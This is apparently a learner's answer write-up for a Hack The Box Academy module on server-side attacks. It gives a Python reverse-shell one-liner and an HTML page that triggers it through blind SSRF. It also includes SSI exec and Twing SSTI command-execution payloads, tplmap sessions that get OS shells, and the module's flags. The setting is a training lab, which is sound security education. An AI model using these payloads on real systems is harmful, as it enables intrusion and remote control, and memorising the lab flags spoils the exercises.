# Server-side Attacks
* Source: [Hack the Box: Academy](https://academy.hackthebox.com/)
* Module: Server-side Attacks
* Tier: II
* Difficulty: Medium
* Category: Offensive
* Time estimate: 8 hours
* Date: 13-07-2022
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Nginx Reverse Proxy & AJP
### Question:
![](./attachments/Pasted%20image%2020220712123215.png)

Follow the guide.

**Answer:** `8.0.53`

---
## 
### Question:
![](./attachments/Pasted%20image%2020220712140116.png)

Payload:
```
┌──(kali㉿kali)-[~]
└─$ export RHOST="10.10.14.194";export RPORT="9090";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

Double URL encode it and insert into a malicious `.html` document.

```html                               
<html>
    <body>
        <b>Reverse Shell via Blind SSRF</b>
        <script>
        var http = new XMLHttpRequest();
        http.open("GET","http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=export%2BRHOST%253D%252210.10.14.194%2522>
        http.send();
        http.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
    </body>
</html>

```

Upload the script after setting a netcat listener up on port 9090.

![](./attachments/Pasted%20image%2020220713105749.png)

```
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 9090
listening on [any] 9090 ...
connect to [10.10.14.194] from (UNKNOWN) [10.129.48.57] 53466
# ls
ls
index.html  internal.py  internal_local.py  start.sh
# ls /        
ls /
app  boot  etc   lib    media  opt   root  sbin  sys  usr
bin  dev   home  lib64  mnt    proc  run   srv   tmp  var
# cat index.html
cat index.html
<html>
<body>
<h1>Internal Web Application</h1>
<a>Hello World!</a>
</body>
</html>
# uname -r
uname -r
5.4.0-89-generic
```

**Answer:** `5.4.0-89`

---
## SSI Injection Exploitation Example
### Question:
![](./attachments/Pasted%20image%2020220713111529.png)

*Hint: Check your current directory*

Can be used to execute commands via SSI.

```html
// Executing commands
<!--#exec cmd="ls" -->
```

This will give is the flag.

```
<!--#exec cmd="cat .htaccess.flag" -->
```

![](./attachments/Pasted%20image%2020220713111842.png)

**Answer:** `HTB{Y0uV3GotSk1lls!}`

---
## SSTI Exploitation Example 1
### Question:
![](./attachments/Pasted%20image%2020220713120351.png)

*Hint: "!" is not part of the flag*

The page is vulnerable to `{{7*'7'}}` meaning it's likely a Jinja2 or Twing template engine.

It's also vulnerable to `{{_self.env.display("TEST")}}` meaning it's a Twing Template engine.

![](./attachments/Pasted%20image%2020220713123958.png)

We can now craft a curl command with a payload that gives us the flag.

```bash
┌──(venv)─(kali㉿kali)-[~/tplmap]
└─$ curl -X POST -d 'name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("env")}}' http://46.101.32.158:31595 | grep FLAG
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0PHP_LDFLAGS=-Wl,-O1 -Wl,--hash-style=both -pie
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2
100 50032    0 49942  100    90   145k    268 --:--:-- --:--:-- --:--:--  146k
FLAG=HTB{IWasJustAskingForYourName}
```

**Answer:** `HTB{IWasJustAskingForYourName}`

---
## SSTI Exploitation Example 2
### Question:
![](./attachments/Pasted%20image%2020220713124212.png)

Using `tplmap` to identify the database and gain a shell:

```
┌──(venv)─(kali㉿kali)-[~/tplmap]
└─$ ./tplmap.py -u 'http://206.189.26.97:30852/jointheteam' -d email=blah --os-shell
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if POST parameter 'email' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag '{{*}}'
[+] Tornado plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  POST parameter: email
  Engine: Tornado
  Injection: {{*}}
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, python code

[+] Run commands on the operating system.
posix-linux $ cat flag.txt
HTB{6M1ll1onD0ll4rD3v3l0p3r}
```

**Answer:** `HTB{6M1ll1onD0ll4rD3v3l0p3r}`

---
## SSTI Exploitation Example 3
### Question:
![](./attachments/Pasted%20image%2020220713124324.png)

Tplmap is epic!

```
┌──(venv)─(kali㉿kali)-[~/tplmap]
└─$ ./tplmap.py -u 'http://157.245.33.77:32152/execute?cmd=' --os-shell
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if GET parameter 'cmd' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag '{{*}}'
[+] Tornado plugin is testing blind injection
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  GET parameter: cmd
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, python code

[+] Run commands on the operating system.
posix-linux $ ls
app.py
flag.txt
index.html
static
posix-linux $ cat flag.txt
HTB{l33tSk1llsY0uH4ve}
```

**Answer:** `HTB{l33tSk1llsY0uH4ve}`

---
## Skills Assessment
### Question:
![](./attachments/Pasted%20image%2020220713124356.png)

**Answer:** ``

---
**Tags:** [[Hack The Box Academy]]